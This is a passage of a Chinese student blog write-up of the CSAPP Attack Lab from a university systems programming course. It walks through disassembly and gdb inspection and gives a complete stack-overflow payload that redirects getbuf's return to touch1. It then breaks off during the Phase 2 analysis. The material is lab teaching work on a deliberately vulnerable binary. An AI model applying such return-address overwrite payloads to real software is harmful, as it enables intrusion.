+  </div>
+  </nav>
+
+
+  <article class="w-full break-words flex min-h-[calc(100vh-var(--navbar-height))] min-w-0 justify-center pb-8 pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+    <main class="w-full min-w-0 max-w-6xl px-6 pt-4 md:px-12">
+
+      
+
+      <h1 class="mt-2 text-4xl font-bold tracking-tight text-slate-900 dark:text-slate-100">CSAPP | Attack Lab (in Chinese)</h1>
+
+      <div class="mt-4 mb-16">
+      <div class="text-gray-500 dark:text-gray-300 text-sm flex items-center flex-wrap gap-y-2"><span class="mr-1">Dec 9, 2023</span><span class="mx-1">·</span>
+        
+          
+          
+          <div class="group inline-flex items-center text-current gap-x-1.5 mx-1">
+            
+            
+            <img src="/author/zhidong-zhang/avatar_hu_fa79320f829e92ff.webp" alt="Zhidong Zhang" class="inline-block h-4 w-4 rounded-full border border-current" loading="lazy" />
+            
+            <div >Zhidong Zhang</div>
+          </div>
+          
+        
+
+        
+        <span class="mx-1">·</span>
+        <span class="mx-1">
+          14 min read
+        </span>
+        
+        </div>
+
+        <div class="mt-3">
+          
+
+
+
+
+
+        </div>
+      </div>
+
+
+
+      
+      
+      
+
+      
+      
+
+      <div class="prose prose-slate lg:prose-xl dark:prose-invert">
+        <blockquote>
+<p>系WHU2021级《系统级程序设计》实验3，节选于CSAPP Lab。<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">CMU实验指导原文PDF</a></p></blockquote>
+<h2 id="概述">概述</h2>
+<blockquote>
+<p>基本上跟着Instruction一步步走就好</p></blockquote>
+<p>在解题之前，先将<strong>CTARGET</strong>和<strong>RTARGET</strong>进行反汇编——执行<code>objdump -d target &gt; target_disas</code>命令。</p>
+<p>通过测试发现，输入的字符串会转化为对应的ASCII码，从栈顶开始一个个存进去。
+但并不是所有的字节值都对应着<em>能够打印出来的字符</em>的ASCII值，因此使用<strong>文件输入</strong>——在文件<code>exploit.txt</code>中直接写字节值，通过<strong>HEX2RAW</strong>生成作为<strong>CTARGET</strong>输入的<code>exploit-raw.txt</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 将exploit.txt内容作为输入提供给./hex2raw，执行的结果重定向输出到exploit-raw.txt</span>
+</span></span><span class="line"><span class="cl">unix&gt; *./hex2raw &lt; exploit.txt &gt; exploit-raw.txt*  
+</span></span><span class="line"><span class="cl"><span class="c1">## gdb调试</span>
+</span></span><span class="line"><span class="cl">unix&gt; gdb ctarget
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> run &lt; exploit-raw.txt
+</span></span><span class="line"><span class="cl">*## 直接运行*
+</span></span><span class="line"><span class="cl">unix&gt; *./ctarget &lt; exploit-raw.txt*  <span class="c1">## 将exploit-raw.txt的内容作为输入提供给./ctarget</span>
+</span></span></code></pre></div><p>在获取汇编指令对应的字节值时，执行以下命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">unix</span><span class="o">&gt;</span> <span class="nv">gcc</span> <span class="o">-</span><span class="nv">c</span> <span class="nv">exploit_command.s</span>
+</span></span><span class="line"><span class="cl"><span class="nf">unix</span><span class="o">&gt;</span> <span class="nv">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="nv">exploit_command.o</span> <span class="o">&gt;</span> <span class="nv">exploit_command.d</span>
+</span></span></code></pre></div><p>之后打开<code>exploit_command.d</code>文件即可，注意获得的字节值应<strong>直接</strong>放入<code>exploit.txt</code>，不需要调转顺序。</p>
+<hr>
+<h2 id="part-i--code-injection-attacks">Part I : <strong>Code Injection Attacks</strong></h2>
+<p>在第一部分，攻击字符串会攻击<strong>CTARGET</strong>程序，而程序的每次执行栈都在同一个位置，于是栈上的数据可等效于可执行代码。这使得程序更容易遭受包含可执行代码字节编码的攻击字符串的攻击。</p>
+<!-- {{% callout note %}} -->
+<blockquote>
+<p>基本操作：在调用函数<code>Gets</code>时打断点，观察读取前后的栈结构变化</p></blockquote>
+<!-- {{% /callout %}} -->
+<h3 id="phase1--level-1">Phase1  Level 1</h3>
+<h4 id="任务">任务</h4>
+<p><strong>CTARGET</strong>中函数<code>test</code>调用了函数<code>getbuf</code>，在<code>getbuf</code>返回之后，原本会继续执行函数<code>test</code>剩下的打印语句，但我们需要让其转而执行函数<code>touch1</code>。</p>
+<p>相关的代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">test</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">val</span> <span class="o">=</span> <span class="nf">getbuf</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;No exploit. Getbuf returned 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="nf">getbuf</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">	<span class="nf">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch1</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="n">vlevel</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>    <span class="cm">/* Part of validation protocol */</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Touch1!: You called touch1()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="思路">思路</h4>
+<p>找到<code>touch1</code>的起始地址的字节表示的位置，使得<code>getbuf</code>结尾处的<code>ret</code>指令将控制转移到<code>touch1</code>。</p>
+<p>具体而言，由于函数<code>Gets</code>不会检查输入长度，我们有机会通过“输入溢出”来改写栈中意外的地方，而在这里“意外的地方”就是<code>getbuf</code>函数返回时的跳转地址，而究竟怎么写需要根据<code>buf[BUFFER_SIZE]</code>的地址（这是函数<code>Get</code>接收输入并写入的地方）。</p>
+<p>查看CTARGET的反汇编文件，可以找到这三个函数的汇编代码：</p>
+<ul>
+<li>
+<p><code>getbuf</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0000000000401762</span> <span class="err">&lt;</span><span class="nf">getbuf</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401762:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">38</span>          	<span class="nv">sub</span>    <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span><span class="o">%</span><span class="nb">rsp</span>  
+</span></span><span class="line"><span class="cl">  <span class="err">401766:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">e7</span>             	<span class="nv">mov</span>    <span class="o">%</span><span class="nb">rsp</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>     <span class="c1">; 分配0x38字节栈空间，作为参数调用Gets函数，可知BUFFER_SIZE=0x38=56</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401769:</span>	<span class="nf">e8</span> <span class="mi">2</span><span class="nv">c</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">callq</span>  <span class="mi">40199</span><span class="nv">a</span> <span class="o">&lt;</span><span class="nv">Gets</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40176</span><span class="nl">e:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401773:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">38</span>          	<span class="nv">add</span>    <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span><span class="o">%</span><span class="nb">rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401777:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
+</span></span></code></pre></div></li>
+<li>
+<p><code>touch1</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0000000000401778</span> <span class="err">&lt;</span><span class="nf">touch1</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401778:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>          	<span class="nv">sub</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40177</span><span class="nl">c:</span>	<span class="nf">c7</span> <span class="mi">05</span> <span class="mi">76</span> <span class="mi">2</span><span class="nv">d</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">01</span> 	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x202d76</span><span class="p">(</span><span class="o">%</span><span class="nv">rip</span><span class="p">)</span>        <span class="err">##</span> <span class="mi">6044</span><span class="nv">fc</span> <span class="o">&lt;</span><span class="nv">vlevel</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401783:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">401786:</span>	<span class="nf">bf</span> <span class="nv">a1</span> <span class="mi">2</span><span class="nv">e</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x402ea1</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40178</span><span class="nl">b:</span>	<span class="nf">e8</span> <span class="nv">c0</span> <span class="nv">f4</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">c50</span> <span class="o">&lt;</span><span class="nv">puts@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401790:</span>	<span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401795:</span>	<span class="nf">e8</span> <span class="nv">ef</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">callq</span>  <span class="mi">401</span><span class="nv">b89</span> <span class="o">&lt;</span><span class="nv">validate</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40179</span><span class="nl">a:</span>	<span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40179</span><span class="nl">f:</span>	<span class="nf">e8</span> <span class="mi">3</span><span class="nv">c</span> <span class="nv">f6</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">de0</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><code>test</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004018</span><span class="nf">dc</span> <span class="o">&lt;</span><span class="nv">test</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">dc:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>          	<span class="nv">sub</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">e0:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">e5:</span>	<span class="nf">e8</span> <span class="mi">78</span> <span class="nv">fe</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">401762</span> <span class="o">&lt;</span><span class="nv">getbuf</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">ea:</span>	<span class="err">89</span> <span class="nf">c6</span>                	<span class="nv">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">esi</span>       <span class="c1">; 调用getbuf后的返回地址</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">ec:</span>	<span class="nf">bf</span> <span class="mi">68</span> <span class="mi">2</span><span class="nv">f</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x402f68</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">f1:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">f6:</span>	<span class="nf">e8</span> <span class="mi">85</span> <span class="nv">f3</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">c80</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">fb:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">08</span>          	<span class="nv">add</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">ff:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
+</span></span></code></pre></div></li>
+</ul>
+<p>可知，<code>touch1</code>函数的起始地址为<code>0x401778</code>，而调用<code>Gets</code>前分配的栈空间大小为56个字节。</p>
+<p>接下来，通过gdb查看调用<code>Gets</code>前的栈空间：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/fc20a2d7-2a94-43d4-9712-a025dfc8b3d0/%E6%88%AA%E5%B1%8F2023-12-10_16.06.05.png" alt="截屏2023-12-10 16.06.05.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>其中<code>0x4018ea</code>是<code>test</code>中<code>getbuf</code>的返回地址，也是我们希望更改的地方。</p>
+<blockquote>
+<p>在这里，我定位返回地址的方法是——从前往后数7*8个字节，发现最后8个字节在<code>0x55654938</code>处，那么<code>0x55654940</code>的8个字节必然是返回地址，其值为<code>0x4018ea</code>；</p></blockquote>
+<h4 id="栈结构">栈结构</h4>
+<p><code>getbuf</code>函数执行<code>ret</code>返回后的栈结构如下：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/511610ad-7ec7-47b0-bbd5-3c3df77e32d1/Untitled.png" alt="Untitled.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>其中蓝色底的格子为函数<code>getbuf</code>的<strong>返回地址</strong>。</p>
+<aside>
+💡 返回地址应该存在**调用者**`test()`栈桢的顶层
+</aside>
+<h4 id="解决">解决</h4>
+<p>因此，攻击字符串的结果为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-basic" data-lang="basic"><span class="line"><span class="cl"><span class="nl">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span>
+</span></span><span class="line"><span class="cl"><span class="nl">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span>
+</span></span><span class="line"><span class="cl"><span class="nl">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span>
+</span></span><span class="line"><span class="cl"><span class="nl">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span>
+</span></span><span class="line"><span class="cl"><span class="nl">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span>
+</span></span><span class="line"><span class="cl"><span class="nl">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span>
+</span></span><span class="line"><span class="cl"><span class="nl">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> </span><span class="il">11</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">78</span><span class="w"> </span><span class="il">17</span><span class="w"> </span><span class="il">40</span>
+</span></span></code></pre></div><p>查看调用<code>Gets</code>后的栈空间</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/87f410b1-0212-4c7b-af33-b552861a4363/%E6%88%AA%E5%B1%8F2023-12-10_16.48.05.png" alt="截屏2023-12-10 16.48.05.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<blockquote>
+<p>这里我们的攻击字符串破坏了栈中不直接和本阶段相关的部分，即<code>0x5558600</code>，但并不会造成问题，因为<code>touch1</code>会使得程序直接退出。</p></blockquote>
+<p>执行后任务完成。</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/45fab74c-7ef2-4964-be9e-e8eed3e2d1af/%E6%88%AA%E5%B1%8F2023-12-10_20.12.57.png" alt="截屏2023-12-10 20.12.57.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<hr>
+<h3 id="phase-2-level-2">Phase 2 Level 2</h3>
+<h4 id="任务-1">任务</h4>
+<p>与<strong>Level 1</strong>类似，我们需要让程序执行<code>touch2</code>而不是返回<code>test</code>；</p>
+<p>但这次我们需要在攻击字符串中加入少许代码，使得调用<code>touch2</code>时参数为我的<strong>cookie</strong>（ungisned类型）。</p>
+<ul>
+<li>
+<p><code>touch2</code>（C语言）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="n">vlevel</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>  <span class="cm">/* part of validation protocol */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Touch2!: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch2(0x%.8x)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">fall</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></li>
+<li>
+<p><code>touch2</code>（反汇编）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">00000000004017</span><span class="nf">a4</span> <span class="o">&lt;</span><span class="nv">touch2</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">a4:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>          	<span class="nv">sub</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">a8:</span>	<span class="err">89</span> <span class="nf">fe</span>                	<span class="nv">mov</span>    <span class="o">%</span><span class="nb">edi</span><span class="p">,</span><span class="o">%</span><span class="nb">esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">aa:</span>	<span class="nf">c7</span> <span class="mi">05</span> <span class="mi">48</span> <span class="mi">3</span><span class="nv">d</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">02</span> 	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x203d48</span><span class="p">(</span><span class="o">%</span><span class="nv">rip</span><span class="p">)</span>        <span class="err">##</span> <span class="mi">6054</span><span class="nv">fc</span> <span class="o">&lt;</span><span class="nv">vlevel</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">b1:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">b4:</span>	<span class="err">3</span><span class="nf">b</span> <span class="mi">3</span><span class="nv">d</span> <span class="mi">4</span><span class="nv">a</span> <span class="mi">3</span><span class="nv">d</span> <span class="mi">20</span> <span class="mi">00</span>    	<span class="nv">cmp</span>    <span class="mh">0x203d4a</span><span class="p">(</span><span class="o">%</span><span class="nv">rip</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span>        <span class="err">##</span> <span class="mi">605504</span> <span class="o">&lt;</span><span class="nv">cookie</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">ba:</span>	<span class="err">75</span> <span class="err">1</span><span class="nf">b</span>                	<span class="nv">jne</span>    <span class="mi">4017</span><span class="nv">d7</span> <span class="o">&lt;</span><span class="nv">touch2</span><span class="o">+</span><span class="mh">0x33</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">bc:</span>	<span class="nf">bf</span> <span class="nv">f8</span> <span class="mi">2</span><span class="nv">f</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x402ff8</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">c1:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">c6:</span>	<span class="nf">e8</span> <span class="nv">b5</span> <span class="nv">f4</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">c80</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">cb:</span>	<span class="nf">bf</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x2</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">d0:</span>	<span class="nf">e8</span> <span class="nv">e4</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">callq</span>  <span class="mi">401</span><span class="nv">cb9</span> <span class="o">&lt;</span><span class="nv">validate</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">d5:</span>	<span class="nf">eb</span> <span class="mi">19</span>                	<span class="nv">jmp</span>    <span class="mi">4017</span><span class="nv">f0</span> <span class="o">&lt;</span><span class="nv">touch2</span><span class="o">+</span><span class="mh">0x4c</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">d7:</span>	<span class="nf">bf</span> <span class="mi">20</span> <span class="mi">30</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x403020</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">dc:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">e1:</span>	<span class="nf">e8</span> <span class="mi">9</span><span class="nv">a</span> <span class="nv">f4</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">c80</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">e6:</span>	<span class="nf">bf</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x2</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">eb:</span>	<span class="nf">e8</span> <span class="mi">7</span><span class="nv">b</span> <span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">callq</span>  <span class="mi">401</span><span class="nv">d6b</span> <span class="o">&lt;</span><span class="nv">fail</span><span class="o">&gt;</span>
